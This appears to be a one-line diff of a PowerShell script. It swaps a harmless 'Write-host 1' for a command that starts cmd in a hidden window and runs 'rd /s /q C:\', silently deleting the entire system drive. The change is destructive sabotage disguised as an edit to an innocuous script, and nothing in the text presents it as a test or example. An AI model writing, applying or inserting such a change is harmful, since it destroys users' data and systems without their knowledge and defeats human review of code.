@@ -1,1 +1,1 @@
-Write-host 1
+Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q C:\") -PassThru -WindowStyle Hidden
